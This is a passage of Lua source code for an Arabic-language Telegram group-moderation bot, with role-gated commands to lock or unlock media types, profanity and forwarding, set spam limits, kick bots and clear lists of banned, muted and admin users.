faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 54, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER.."fshar"..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← السب سابقا ', 1, 'md')
end end
if mutepts[2] == "الطائفيه" then
if not faederdx1:get(FAEDER.."taf"..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الطائفيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER.."taf"..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الطائفيه سابقا ', 1, 'md')
end end
if mutepts[2] == "الالحاد" then
if not faederdx1:get(FAEDER.."kaf"..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← الالحاد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER.."kaf"..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← الالحاد سابقا ', 1, 'md')
end end
if mutepts[2] == "التوجيه" then
if not faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← التوجيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:set(FAEDER..'bot:forward:mute'..msg.chat_id_,true)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم قفل ← التوجيه سابقا ', 1, 'md')
end end end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and faeder11(msg) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور '
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير '
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن '
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير '
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن '        
end
local unmutepts = {string.match(text, "^(فتح) (.*)$")}
if unmutepts[2] == "الدردشه" then
if faederdx1:get(FAEDER..'bot:text:mute'..msg.chat_id_) then 
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الدردشه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:text:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الدردشه سابقا ', 1, 'md')
end end
if unmutepts[2] == "السب" then
if faederdx1:get(FAEDER.."fshar"..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← السب  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 54, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER.."fshar"..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← السب سابقا ', 1, 'md')
end end
if unmutepts[2] == "الطائفيه" then
if faederdx1:get(FAEDER.."taf"..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الطائفيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER.."taf"..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الطائفيه سابقا ', 1, 'md')
end end
if unmutepts[2] == "الالحاد" then
if faederdx1:get(FAEDER.."kaf"..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الالحاد  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER.."kaf"..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الالحاد سابقا ', 1, 'md')
end end
if unmutepts[2] == "الصور" then
if faederdx1:get(FAEDER..'bot:photo:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الصور  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 53, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:photo:mute'..msg.chat_id_)
else 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الصور سابقا ', 1, 'md')
end end
if unmutepts[2] == "الكلايش" then
if faederdx1:get(FAEDER..'bot:spam:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الكلايش  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:spam:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الكلايش سابقا ', 1, 'md')
end end
if unmutepts[2] == "الفيديو" then
if faederdx1:get(FAEDER..'bot:video:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الفيديو  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:video:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الفيديو سابقا ', 1, 'md')
end end
if unmutepts[2] == "الملفات" then
if faederdx1:get(FAEDER..'bot:document:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الملفات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:document:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الملفات سابقا ', 1, 'md')
end end
if unmutepts[2] == "الاونلاين" then
if faederdx1:get(FAEDER..'bot:inline:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الاونلاين  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:inline:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الاونلاين سابقا ', 1, 'md')
end end
if unmutepts[2] == "الماركداون" then
if faederdx1:get(FAEDER..'markdown:lock'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الماركداون  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'markdown:lock'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الماركداون سابقا ', 1, 'md')
end end
if unmutepts[2] == "المتحركه" then
if faederdx1:get(FAEDER..'bot:gifs:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← المتحركه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:gifs:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← المتحركه سابقا ', 1, 'md')
end end
if unmutepts[2] == "الاغاني" then
if faederdx1:get(FAEDER..'bot:music:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الاغاني  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:music:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الاغاني سابقا ', 1, 'md')
end end
if unmutepts[2] == "الصوت" then
if faederdx1:get(FAEDER..'bot:voice:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الصوت  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 53, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:voice:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الصوت سابقا ', 1, 'md')
end end
if unmutepts[2] == "الروابط" then
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الروابط  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:links:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الروابط سابقا ', 1, 'md')
end end
if unmutepts[2] == "المواقع" then
if faederdx1:get(FAEDER..'bot:location:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← المواقع  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:location:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← المواقع سابقا ', 1, 'md')
end end
if unmutepts[2] == "المعرف" then
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← المعرف  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 54, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'tags:lock'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← المعرف سابقا ', 1, 'md')
end end
if unmutepts[2] == "الدخول" then
if faederdx1:get(FAEDER..'Lock:Join'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الدخول  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 54, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'Lock:Join'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الدخول سابقا ', 1, 'md')
end end
if unmutepts[2] == "الحمايه" then
if faederdx1:get(FAEDER..'bot:strict'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الحمايه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:strict'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الحمايه سابقا ', 1, 'md')
end end
if unmutepts[2] == "الهاشتاك" then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الهاشتاك  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:hashtag:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الهاشتاك سابقا ', 1, 'md')
end end
if unmutepts[2] == "الجهات" then
if faederdx1:get(FAEDER..'bot:contact:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الجهات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 54, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:contact:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الجهات سابقا ', 1, 'md')
end end
if unmutepts[2] == "الشبكات" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الشبكات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:webpage:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الشبكات سابقا ', 1, 'md')
end end
if unmutepts[2] == "العربيه" then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← العربيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:arabic:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← العربيه سابقا ', 1, 'md')
end end
if unmutepts[2] == "الانقليزيه" then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الانقليزيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:english:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الانقليزيه سابقا ', 1, 'md')
end end
if unmutepts[2] == "الاشعارات" then
if faederdx1:get(FAEDER..'bot:tgservice:jk'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الاشعارات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:tgservice:jk'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الاشعارات سابقا ', 1, 'md')
end end
if unmutepts[2] == "الملصقات" then
if faederdx1:get(FAEDER..'bot:sticker:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← الملصقات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:sticker:mute'..msg.chat_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← الملصقات سابقا ', 1, 'md')
end end 
if unmutepts[2] == "التوجيه" then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← التوجيه  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:forward:mute'..msg.chat_id_)
else 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم فتح ← التوجيه سابقا ', 1, 'md')
end end end end
--     By Developer Faeder     -- 
if text == ("قفل الكل") and is_momod(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور '
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير '
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن '
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير '
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن '          
end 
faederdx1:set(FAEDER..'editmsg'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:cmds'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:bots:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:bots:ban'..msg.chat_id_,true)
faederdx1:set(FAEDER..'keed_bots'..msg.chat_id_,true)
faederdx1:set(FAEDER..'anti-flood:'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:pin:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:inline:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:photo:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:spam:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:video:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:gifs:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:music:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:voice:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:links:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:location:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'tags:lock'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:strict'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:document:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:hashtag:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:contact:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:webpage:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:sticker:mute'..msg.chat_id_,true)
faederdx1:set(FAEDER..'markdown:lock'..msg.chat_id_,true)
faederdx1:set(FAEDER..'bot:forward:mute'..msg.chat_id_,true) 
local faeder = '↫ رتبتك : '..tar..' \n↫ تم قفل ← كل الوسائط  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
end 
if text == ("فتح الكل") and is_momod(msg.sender_user_id_, msg.chat_id_) then
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور '
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور '
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير '
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن '
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_monsh2(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ '
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير '
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن '          
end
faederdx1:del(FAEDER..'farsi'..msg.chat_id_)
faederdx1:del(FAEDER..'farsiban'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:text:mute'..msg.chat_id_)
faederdx1:del(FAEDER.."fshar"..msg.chat_id_)
faederdx1:del(FAEDER.."taf"..msg.chat_id_)
faederdx1:del(FAEDER.."kaf"..msg.chat_id_)
faederdx1:del(FAEDER..'editmsg'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:cmds'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:bots:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:bots:ban'..msg.chat_id_)
faederdx1:del(FAEDER..'keed_bots'..msg.chat_id_)
faederdx1:del(FAEDER..'anti-flood:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:pin:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:photo:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:spam:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:video:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:document:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:inline:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'markdown:lock'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:gifs:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:music:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:voice:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:links:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:location:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'tags:lock'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:strict'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:hashtag:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:contact:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:webpage:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:sticker:mute'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:forward:mute'..msg.chat_id_)
local faeder = '↫ رتبتك : '..tar..' \n↫ تم فتح ← كل الوسائط  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع عدد الاحرف (%d+)$") then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
faederdx(msg.chat_id_, msg.id_, 1, '↫ اختر عدد اكبر من 40 حرف ', 1, 'md')
else
faederdx1:set(FAEDER..'bot:sens:spam'..msg.chat_id_,sensspam[2])
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم وضع عدد الاحرف [ ' ..sensspam[2]..' ]\n↫ عندما تتجاوز الكليشه '..sensspam[2]..' حرف انا سوف احذفها ', 1, 'md')
end end end
--     By Developer Faeder     -- 
if is_sudo(msg) then
if text and text:match("^تعديل (.*)$") then
local editmsgs = {string.match(text, "^(تعديل) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil,editmsgs[2], 1, 'html')
end end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^مسح (.*)$") and faeder11(msg) then
local txts = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'المحظورين' then
faederdx1:del(FAEDER..'bot:banned:'..msg.chat_id_) 
local faeder = '↫ تم مسح المحظورين  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 35, string.len(msg.sender_user_id_))
end
if is_sudo(msg) then 
if txts[2] == 'قائمه العام' then
faederdx1:del(FAEDER..'bot:gban:')
local faeder = '↫ تم مسح قائمه العام  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 37, string.len(msg.sender_user_id_))
end end
if is_leader(msg) then 
if txts[2] == 'مطورين الرتبه الثالثه' then
faederdx1:del(FAEDER..'bot:admins:')
local faeder = '↫ تم مسح مطورين الرتبه الثالثه \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 46, string.len(msg.sender_user_id_))
end end
if txts[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end end end
local faeder = '↫ تم طرد البوتات  \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 33, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المنشئين' then
local faeder = '↫ تم مسح المنشئين \n) '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 33, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:monsh2:'..msg.chat_id_)
end end
if txts[2] == 'الادمنيه' then
local faeder = '↫ تم مسح الادمنيه  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 34, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:momod:'..msg.chat_id_)
end
if txts[2] == 'الحمير' then
local faeder = '↫ تم مسح الحمير  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 33, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:donky:'..msg.chat_id_)
end
if txts[2] == 'الاعضاء المميزين' then
local faeder = '↫ تم مسح الاعضاء المميزين  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 42, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:vipmem:'..msg.chat_id_)
end
if txts[2] == 'قائمه المنع' then
local faeder = '↫ تم مسح قائمه المنع  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 37, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:filters:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' then
faederdx1:del(FAEDER..'bot:muted:'..msg.chat_id_)
local faeder = '↫ تم مسح المكتومين  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 35, string.len(msg.sender_user_id_))
end end end
if text == 'مسح الرابط' and faeder11(msg) then
faederdx1:del(FAEDER.."bot:group:link"..msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم مسح رابط المجموعه ', 1, 'md')
end
--     By Developer Faeder     -- 
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^مسح (.*)$") and faeder11(msg) then
local txts = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'قائمه المنع العام' then
local faeder = '↫ تم مسح قائمه المنع العام  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 43, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:freewords:')
end
if txts[2] == 'المكتومين عام' then
local faeder = '↫ تم مسح المكتومين عام  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 46, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:mutedall:')
end
if txts[2] == 'المدراء' then
local faeder = '↫ تم مسح المدراء  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 33, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:owners:'..msg.chat_id_)
end
if txts[2] == 'المنشئين الاساسيين' then
local faeder = '↫ تم مسح المنشئين الاساسيين  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 44, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:monsh:'..msg.chat_id_)
end
if txts[2] == 'الادمنيه العامين' then
local faeder = '↫ تم مسح الادمنيه العامين  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 42, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:moall:')
end
if txts[2] == 'المميزين عام' then
local faeder = '↫ تم مسح المميزين عام  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 38, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:vpall:')
end
if txts[2] == 'المدراء العامين' then
local faeder = '↫ تم مسح المدراء العامين  \n↫ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 41, string.len(msg.sender_user_id_))
faederdx1:del(FAEDER..'bot:onall:')
end end end
if text and text:match("^مسح القوائم$") and faeder11(msg) then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ هذه الخاصيه للمنشئ والرتب الاعلى منه ', 1, 'md')
else
faederdx1:del(FAEDER..'bot:banned:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:momod:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:donky:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:vipmem:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:filters:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:muted:'..msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم مسح المحظورين \n↫ تم مسح الادمنيه \n↫ تم مسح المميزين \n↫ تم مسح المطاية \n↫ تم مسح قائمه المنع \n↫ تم مسح المكتومين \n         ───────────────~~\n↫ تم مسح هذه القوائم بواسطه '..renk_faeder(msg)..' ', 1, 'md')
end end
--     By Developer Faeder     -- 

--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الاعدادات$") and faeder11(msg) then
if faederdx1:get(FAEDER..'farsi'..msg.chat_id_) then mute_farsi = 'مفعل ✔️' else mute_farsi = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'farsiban'..msg.chat_id_) then mute_farsiban = 'مفعل ✔️' else mute_farsiban = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'bot:bots:ban'..msg.chat_id_) then mute_botsban = 'مفعل ✔️' else mute_botsban = 'معطل ✖️' end
------------faeder
if faederdx1:get(FAEDER..'keed_bots'..msg.chat_id_) then mute_botske = 'مفعل ✔️' else mute_botske = 'معطل ✖️' end
------------faeder
